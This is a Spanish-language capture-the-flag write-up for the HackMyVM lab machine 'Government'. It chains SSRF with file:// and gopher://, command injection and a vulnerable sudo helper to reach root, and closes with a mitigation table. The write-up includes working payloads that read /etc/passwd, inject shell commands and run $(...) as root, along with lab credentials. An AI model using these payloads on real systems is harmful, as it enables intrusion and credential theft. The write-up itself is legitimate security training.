[Inicio](../../../README.md) · [Red Team](../../README.md)

**Estado: completada hasta root** · [🌐 Abrir writeup visual](https://w4ltersec.github.io/cybersecurity-labs/red-team/hackmyvm/government/Government-Writeup.html)

# Government — HackMyVM — Writeup completo

> **Sistema documentado:** Linux / Ubuntu 26.04 · **Target del laboratorio:** `192.168.1.31`
> **Portal:** SIESTE · **Cadena:** `SSRF / gopher → admin web → www-data → fake → root`

[🔗 Abrir Government en HackMyVM](https://hackmyvm.eu/machine/Government)

## Resumen ejecutivo

| Fase | Técnica | Resultado documentado |
| --- | --- | --- |
| Reconocimiento | Nmap y enumeración del portal SIESTE | SSH, HTTP y vhost interno |
| Acceso inicial | SSRF, lectura con file:// y peticiones gopher:// a loopback | Alta de una cuenta admin web |
| Ejecución de comandos | Inyección autenticada en dashboard.php | Usuario www-data |
| Movimiento lateral | Reutilización de la credencial de la aplicación | Usuario fake y user.txt |
| Escalada | sudo.ws y command injection en /opt/user_sync | Usuario root y root.txt |

## Flags

- **User:** `HMV{SSRF_F1l3_3num_4nd_G0ph3r_Pwn4g3}`
- **Root:** `HMV{Never_trust_localhost_SIESTE}`

00 — Resumen

## Cadena de ataque

Linux (Ubuntu 26.04, kernel 7.0.0) sirviendo el portal **SIESTE**. Cinco eslabones encadenados desde la web hasta `root`.

#### SSRF en sync.php High

cURL con `file://` y `gopher://` habilitados — lectura de ficheros y fuente.

#### Bypass loopback con gopher:// High

Se fuerza origen 127.0.0.1 contra la API admin `registration.php`.

#### Command injection en dashboard.php Critical

`shell_exec` con `service_name` sin sanitizar → RCE **www-data**.

#### Reuso de credencial → fake User

fake = `Containment2026!` (la misma de la BD).

#### sudo.ws /opt/user_sync + $() Root

Regla sudoers solo en el sudo clásico + inyección entre comillas dobles.

01 — Reconocimiento

## Enumeración de superficie

**nmap -sC -sV -p- 192.168.1.31**

```text
22/tcp  open  ssh      OpenSSH 10.2p1 Ubuntu 2ubuntu3.6
80/tcp  open  http     Apache httpd 2.4.66 (Ubuntu)
# Ubuntu 26.04 "Resolute Raccoon" · kernel 7.0.0-43-generic
```

El sitio **SIESTE** expone `index/sync/login/dashboard/db/logout.php` y `/api/users/registration.php`. Existe un vhost interno `gov.internal` restringido a loopback (comprueba `REMOTE_ADDR`).

02 — Foothold web

## SSRF · gopher:// · RCE www-data

### 2.1 · SSRF / LFI en sync.php

`report_url` (POST) se pasa a cURL con `file/http/gopher` habilitados; solo filtra `php://`.

**file:// read**

```text
curl -s -X POST --data-urlencode "report_url=file:///etc/passwd" \
     http://192.168.1.31/sync.php
→ fake:x:1000:1000:Dr. F.A.Ke:/home/fake:/bin/bash
# db.php filtra:  sieste_app / Containment2026!  (ALL PRIV en sieste_db)
```

### 2.2 · gopher:// → bypass del control por IP

`registration.php` concede rol **admin** pero solo acepta `127.0.0.1`. Con `gopher://` el servidor se envía a sí mismo un POST crudo → origen loopback.

**gopher ssrf**

```text
gopher://127.0.0.1:80/_POST%20/api/users/registration.php%20HTTP/1.1...
   body: {"username":"hexop","password":"Hexpass123!"}
→ SUCCESS: provisioned into administrative clearance group
```

### 2.3 · Command injection autenticada en dashboard.php

Como admin: `shell_exec("systemctl status " . $service)` con `service_name` sin sanitizar.

**rce → www-data**

```text
curl -s -b cookies -X POST --data-urlencode 'service_name=x; id; hostname' \
     http://192.168.1.31/dashboard.php
→ uid=33(www-data) ... host: sieste
```

03 — www-data → fake

## El hash corrupto y el reuso de credencial

**La trampa.** El hash de `fake` en la BD (`FEQ6WFHk5e042ze/5v…`, 100 chars **sin un solo `$`**) es **incrackeable por diseño**. El binario `/opt/user_sync` lo inserta en MySQL así:

**user_sync.c — ACTION 3**

```text
mysql ... -e "INSERT ... password_hash='$6$SALT$HASH' ... ; # <pw> "
```

Todo el argumento `-e "…"` va entre **comillas dobles** → las comillas simples son literales y `/bin/sh` **expande** `$6/$SALT/$HASH` antes de MySQL. El hash guardado queda mutilado. Verificado por reversing de `main`. Por eso rockyou nunca cae.

**La ruta real.** `user_sync.c` también hace `echo 'user:pw' | chpasswd` → la password de **sistema** de fake es el cleartext. Es **reuso**: `fake = Containment2026!`.

**su fake → user.txt**

```text
# SSH solo acepta publickey → se usa su(1) desde la shell www-data
su fake   # password: Containment2026!   ✓ uid=1000(fake)
cat /home/fake/user.txt  → HMV{SSRF_F1l3_3num_4nd_G0ph3r_Pwn4g3}
# persistencia: /home/fake/.ssh/id_rsa_fake → shell SSH estable
```

04 — fake → root

## sudo clásico + inyección como root

**El detalle oculto.** `sudo -l` (sudo-rs, el default) dice *"may not run sudo"*. Pero el sudo **clásico** `sudo.ws` sí tiene la regla — sudo-rs no la honra.

**sudo.ws -l**

```text
User fake may run the following commands on sieste:
    (ALL : ALL) NOPASSWD: /usr/bin/sudo -l
    (root) NOPASSWD: /opt/user_sync
```

### Command injection en el helper user_sync (root)

`/opt/user_sync` hace `setresuid(0,0,0)`; la password va tras `#` dentro de comillas dobles → `$(...)` corre como root. El validador solo bloquea `'` `;` `|` → se usa `&&`.

**pwn → root.txt**

```text
# como fake (NOPASSWD, no pide contraseña)
sudo.ws /opt/user_sync fake '$(cp /root/root.txt /tmp/.rf && chmod 644 /tmp/.rf)'
cat /tmp/.rf
→ HMV{Never_trust_localhost_SIESTE}

# prueba de root: línea solo-root de /etc/shadow
root:$y$j9T$YVTh2ZQo04U3H0mXe870y/$I90WCg...NsK8:...
```

`/tmp` está montado `nosuid` (un SUID-bash no eleva), pero el payload `$(...)` ya se ejecuta como root, así que se lee el flag directamente.

05 — Defensa

## Fallos y mitigaciones

| # | Fallo | Mitigación |
| --- | --- | --- |
| 1 | SSRF con esquemas peligrosos (`file`/`gopher`) en sync.php | Allow-list de esquemas y hosts; bloquear file/gopher |
| 2 | `gopher://` bypassa autorización por `REMOTE_ADDR` | No autorizar por IP de origen; auth real server-to-server |
| 3 | Command injection autenticada en dashboard.php | `execve`+argv sin shell; validar input |
| 4 | Secretos en claro (db.php, binario user_sync) | Secret manager / env vars; rotar |
| 5 | Reuso de credencial app == sistema (fake) | Credenciales únicas por servicio |
| 6 | Helper sudo-NOPASSWD que arma comandos shell con input entre comillas dobles | `execve`+argv; revisar sudoers en **ambos** sudo |

**Lección:** *"Never trust localhost"* — el origen loopback no es autorización, y concatenar input en comandos shell (aunque esté "entre comillas") es explotable. La divergencia `sudo-rs` vs `sudo.ws` oculta reglas peligrosas.


---

*Publicado en el portfolio de W4lterSec a partir del HTML aportado. Se conserva el crédito original del documento a HexSecure. Las credenciales y flags corresponden al laboratorio de prácticas.*
